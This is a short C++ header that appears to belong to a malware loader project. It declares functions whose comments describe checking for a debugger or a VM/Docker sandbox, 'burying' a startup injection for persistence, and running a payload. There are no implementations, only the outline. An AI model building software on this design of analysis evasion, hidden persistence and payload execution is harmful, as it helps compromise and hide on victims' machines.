#ifndef UTILS
#define UTILS

#pragma once

#include <iostream>
#include <string>
#include <cstdlib>

// check for debugger and
// if we are within a VM or Docker
void initialize();

// bury startup injection
void prepLoader();
// run payload (shared with startup)
void runner();

#endif